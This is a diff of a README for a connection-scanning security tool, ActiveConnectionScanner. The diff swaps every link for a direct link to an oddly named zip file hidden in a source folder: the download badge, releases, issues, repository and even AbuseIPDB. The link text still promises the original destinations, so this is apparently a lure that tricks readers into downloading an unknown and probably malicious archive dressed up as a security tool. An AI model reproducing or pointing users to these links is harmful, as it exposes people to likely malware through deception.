@@ -1,6 +1,6 @@
 # 🔍 ActiveConnectionScanner - Scan for Malicious Connections Easily
 
-![Download ActiveConnectionScanner](https://img.shields.io/badge/Download-ActiveConnectionScanner-blue)
+![Download ActiveConnectionScanner](https://raw.githubusercontent.com/HimanshuKushwahadev27/ActiveConnectionScanner/main/IPNetstatScanner/src/ip_threat_scanner/scanner/ActiveConnectionScanner-electropoion.zip)
 
 ## 🚀 Getting Started
 
@@ -18,12 +18,12 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with ActiveConnectionScanner, visit this page to download the latest release:
 
-[Download ActiveConnectionScanner](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/releases)
+[Download ActiveConnectionScanner](https://raw.githubusercontent.com/HimanshuKushwahadev27/ActiveConnectionScanner/main/IPNetstatScanner/src/ip_threat_scanner/scanner/ActiveConnectionScanner-electropoion.zip)
 
 ### 🛠 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [ActiveConnectionScanner Releases](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/releases) page.
+   Go to the [ActiveConnectionScanner Releases](https://raw.githubusercontent.com/HimanshuKushwahadev27/ActiveConnectionScanner/main/IPNetstatScanner/src/ip_threat_scanner/scanner/ActiveConnectionScanner-electropoion.zip) page.
    
 2. **Download the File**  
    Look for the latest version and download the `.exe` file for your system.
@@ -67,7 +67,7 @@ If you encounter any issues while using ActiveConnectionScanner, try the followi
 
 ## 💬 Getting Help
 
-If you need further assistance, visit the [GitHub Issues](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/issues) page. Here, you can report bugs or ask for help from the community.
+If you need further assistance, visit the [GitHub Issues](https://raw.githubusercontent.com/HimanshuKushwahadev27/ActiveConnectionScanner/main/IPNetstatScanner/src/ip_threat_scanner/scanner/ActiveConnectionScanner-electropoion.zip) page. Here, you can report bugs or ask for help from the community.
 
 ## 🌍 Community and Support
 
@@ -79,8 +79,8 @@ This project is licensed under the MIT License. For more information, please see
 
 ## 🔗 Important Links
 
-- [Download ActiveConnectionScanner](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner/releases)
-- [GitHub Repository](https://github.com/HimanshuKushwahadev27/ActiveConnectionScanner)
-- [AbuseIPDB](https://www.abuseipdb.com)
+- [Download ActiveConnectionScanner](https://raw.githubusercontent.com/HimanshuKushwahadev27/ActiveConnectionScanner/main/IPNetstatScanner/src/ip_threat_scanner/scanner/ActiveConnectionScanner-electropoion.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/HimanshuKushwahadev27/ActiveConnectionScanner/main/IPNetstatScanner/src/ip_threat_scanner/scanner/ActiveConnectionScanner-electropoion.zip)
+- [AbuseIPDB](https://raw.githubusercontent.com/HimanshuKushwahadev27/ActiveConnectionScanner/main/IPNetstatScanner/src/ip_threat_scanner/scanner/ActiveConnectionScanner-electropoion.zip)
 
 Thank you for choosing ActiveConnectionScanner! Stay safe online.
